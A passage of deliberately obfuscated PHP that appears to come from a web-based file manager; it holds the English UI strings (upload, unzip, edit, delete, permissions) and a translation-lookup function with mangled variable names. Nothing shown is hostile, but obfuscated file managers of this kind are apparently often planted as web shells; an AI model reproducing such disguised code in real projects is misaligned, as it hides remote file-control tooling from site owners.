Selection';$iiiiiiiii['en']['DestinationFolder']='Destination Folder';$iiiiiiiii['en']['ItemType']='Item Type';$iiiiiiiii['en']['ItemName']='Item Name';$iiiiiiiii['en']['CreateNow']='Create Now';$iiiiiiiii['en']['Download']='Download';$iiiiiiiii['en']['Open']='Open';$iiiiiiiii['en']['UnZip']='UnZip';$iiiiiiiii['en']['UnZipToFolder']='UnZip to folder';$iiiiiiiii['en']['Edit']='Edit';$iiiiiiiii['en']['NormalEditor']='Normal Editor';$iiiiiiiii['en']['BackUp']='Back Up';$iiiiiiiii['en']['SourceFolder']='Source Folder';$iiiiiiiii['en']['Files']='Files';$iiiiiiiii['en']['Move']='Move';$iiiiiiiii['en']['Change']='Change';$iiiiiiiii['en']['Settings']='Settings';$iiiiiiiii['en']['Language']='Language';$iiiiiiiii['en']['ErrorReporting']='Error Reporting';$iiiiiiiii['en']['ShowHiddenFiles']='Show Hidden Files';$iiiiiiiii['en']['Help']='Help';$iiiiiiiii['en']['Created']='Created';$iiiiiiiii['en']['Help Documents']='Help Documents';$iiiiiiiii['en']['Report Issue']='Report Issue';$iiiiiiiii['en']['Generate']='Generate';$iiiiiiiii['en']['FullSize']='Full Size';$iiiiiiiii['en']['HideColumns']='Hide Perms/Owner columns';$iiiiiiiii['en']['You are logged in']='You are logged in';$iiiiiiiii['en']['Nothing selected']='Nothing selected';$iiiiiiiii['en']['Paths must be not equal']='Paths must be not equal';$iiiiiiiii['en']['Renamed from']='Renamed from';$iiiiiiiii['en']['Archive not unpacked']='Archive not unpacked';$iiiiiiiii['en']['Deleted']='Deleted';$iiiiiiiii['en']['Archive not created']='Archive not created';$iiiiiiiii['en']['Copied from']='Copied from';$iiiiiiiii['en']['Permissions changed']='Permissions changed';$iiiiiiiii['en']['to']='to';$iiiiiiiii['en']['Saved Successfully']='Saved Successfully';$iiiiiiiii['en']['not found!']='not found!';$iiiiiiiii['en']['File Saved Successfully']='File Saved Successfully';$iiiiiiiii['en']['Archive']='Archive';$iiiiiiiii['en']['Permissions not changed']='Permissions not changed';$iiiiiiiii['en']['Select folder']='Select folder';$iiiiiiiii['en']['Source path not defined']='Source path not defined';$iiiiiiiii['en']['already exists']='already exists';$iiiiiiiii['en']['Error while moving from']='Error while moving from';$iiiiiiiii['en']['Create archive?']='Create archive?';$iiiiiiiii['en']['Invalid file or folder name']='Invalid file or folder name';$iiiiiiiii['en']['Archive unpacked']='Archive unpacked';$iiiiiiiii['en']['File extension is not allowed']='File extension is not allowed';$iiiiiiiii['en']['Root path']='Root path';$iiiiiiiii['en']['Error while renaming from']='Error while renaming from';$iiiiiiiii['en']['File not found']='File not found';$iiiiiiiii['en']['Error while deleting items']='Error while deleting items';$iiiiiiiii['en']['Moved from']='Moved from';$iiiiiiiii['en']['Generate new password hash']='Generate new password hash';$iiiiiiiii['en']['Login failed. Invalid username or password']='Login failed. Invalid username or password';$iiiiiiiii['en']['password_hash not supported, Upgrade PHP version']='password_hash not supported, Upgrade PHP version';$iiiiiiiii['en']['Advanced Search']='Advanced Search';$iiiiiiiii['en']['Error while copying from']='Error while copying from';$iiiiiiiii['en']['Invalid characters in file name']='Invalid characters in file name';$iiiiiiiii['en']['FILE EXTENSION HAS NOT SUPPORTED']='FILE EXTENSION HAS NOT SUPPORTED';$iiiiiiiii['en']['Selected files and folder deleted']='Selected files and folder deleted';$iiiiiiiii['en']['Error while fetching archive info']='Error while fetching archive info';$iiiiiiiii['en']['Delete selected files and folders?']='Delete selected files and folders?';$iiiiiiiii['en']['Search file in folder and subfolders...']='Search file in folder and subfolders...';$iiiiiiiii['en']['Access denied. IP restriction applicable']='Access denied. IP restriction applicable';$iiiiiiiii['en']['Invalid characters in file or folder name']='Invalid characters in file or folder name';$iiiiiiiii['en']['Operations with archives are not available']='Operations with archives are not available';$iiiiiiiii['en']['File or folder with this path already exists']='File or folder with this path already exists';$sssssssssss=fm_get_translations($iiiiiiiii);$iiiiiiiii=$sssssssssss?$sssssssssss:$iiiiiiiii;if(!strlen($oo))$oo='en';if(isset($iiiiiiiii[$oo][$rrrrrrrrrrr]))return fm_enc($iiiiiiiii[$oo][$rrrrrrrrrrr]);else if(isset($iiiiiiiii['en'][$rrrrrrrrrrr]))return fm_enc($iiiiiiiii['en'][$rrrrrrrrrrr]);else return"$rrrrrrrrrrr";}?>